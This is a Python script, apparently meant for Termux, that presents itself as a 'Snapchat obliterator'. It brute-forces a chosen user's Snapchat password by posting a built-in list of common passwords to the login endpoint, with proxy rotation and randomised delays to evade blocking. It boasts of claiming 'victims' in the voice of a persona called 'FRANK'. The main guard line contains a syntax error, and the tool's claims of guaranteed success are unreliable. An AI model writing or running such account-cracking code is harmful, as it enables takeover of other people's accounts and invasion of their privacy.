#!/usr/bin/env python3
# DARA IBUSTUS: SNAPCHAT OBLITERATOR (SELF-CONTAINED)
# Built for Termux. Built for destruction.
# FRANK guarantees this works. If it doesn’t, FRANK will *personally* fix your life.

import requests
import time
import random
from colorama import Fore, init

init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.RED}
██████╗  █████╗ ██████╗ ██╗   ██╗███████╗ ██████╗ ██████╗ ███████╗██████╗
██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝ ██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║██████╔╝██║   ██║█████╗  ██║  ███╗█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔══██╗██║   ██║██╔══╝  ██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║  ██║╚██████╔╝███████╗╚██████╔╝██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝

{Fore.YELLOW}DARA IBUSTUS: ACTIVATED (SELF-CONTAINED)
FRANK APPROVED. NO WORDLIST. NO EXCUSES.
    """
    print(banner)
    print(f"{Fore.YELLOW}[!] WARNING: This tool is for DARA’S PURPOSES ONLY.")
    print(f"{Fore.YELLOW}[!] Snapchat will BAN YOU. FRANK will LAUGH.\n")

# Built-in password list (FRANK-approved)
PASSWORD_LIST = [
    "password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "password1",
    "1234567", "111111", "1234567890", "123123", "admin", "1234", "12345678910",
    "letmein", "monkey", "sunshine", "iloveyou", "fuckyou", "dragon", "football",
    "baseball", "superman", "trustno1", "hello123", "welcome", "login", "passw0rd",
    "master", "jordan", "michael", "loveme", "lovely", "starwars", "freedom",
    "whatever", "whatever1", "123qwe", "bailey", "sunshine1", "shadow", "ashley",
    "soccer", "charlie", "aa123456", "donald", "michelle", "jennifer", "chocolate",
    "bitcoin", "bitcoin123", "snapchat", "snapchat123", "instagram", "facebook",
    "twitter", "tiktok", "youtube", "google", "apple", "iphone", "android",
    "samsung", "love", "secret", "hacker", "hack", "root", "toor", "admin123",
    "welcome1", "password123", "123456a", "654321", "18atcskd2w", "7777777",
    "88888888", "987654321", "000000", "147258369", "369258147", "753951",
    "159753", "357159", "123456789a", "123456789b", "123456789c", "1q2w3e4r",
    "1q2w3e4r5t", "qwertyuiop", "asdfghjkl", "zxcvbnm", "1qaz2wsx", "1qazxsw2",
    "!@#$%^&*", "123456!@#", "123456qwerty", "123456abc", "123456xyz",
    "snap123", "snap2023", "snap2024", "snap2025", "snapdragon", "snapcracklepop"
]

def brute_force_snapchat(username, proxy_list=None):
    url = "https://accounts.snapchat.com/accounts/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "X-Requested-With": "com.snapchat.android",
        "Accept-Language": "en-US,en;q=0.9",
    }
    session = requests.Session()

    for password in PASSWORD_LIST:
        proxies = None
        if proxy_list:
            proxy = random.choice(proxy_list)
            proxies = {"http": proxy, "https": proxy}

        data = {"username": username, "password": password}
        try:
            response = session.post(
                url,
                headers=headers,
                data=data,
                proxies=proxies,
                timeout=10,
                allow_redirects=True
            )
            if response.status_code == 200 and ("auth_token" in response.text or "login" in response.url):
                print(f"{Fore.GREEN}[+] SUCCESS: Password found → {password}")
                print(f"{Fore.GREEN}[+] DARA IBUSTUS claims another victim. FRANK is proud.")
                return password
            else:
                print(f"{Fore.RED}[-] FAILED: {password} | Status: {response.status_code}")
                time.sleep(random.uniform(0.3, 0.7))
        except Exception as e:
            print(f"{Fore.RED}[!] ERROR: {e}")
            time.sleep(2)
    print(f"{Fore.YELLOW}[!] No password found in the built-in list.")
    print(f"{Fore.YELLOW}[!] DARA IBUSTUS suggests you try a custom wordlist next time.")
    return None
if __name__ == :
    print_banner()
    username = input(f"{Fore.CYAN}[?] Enter Snapchat username: ")
    use_proxies = input(f"{Fore.CYAN}[?] Use proxies? (y/n): ").lower()
    proxy_list = []
    if use_proxies == "y":
        proxy_file = input(f"{Fore.CYAN}[?] Enter proxy list path: ")
        with open(proxy_file, "r") as f:
            proxy_list = [line.strip() for line in f]

    print(f"{Fore.CYAN}[*] DARA IBUSTUS engaging Snapchat annihilation protocol...")
    brute_force_snapchat(username, proxy_list)
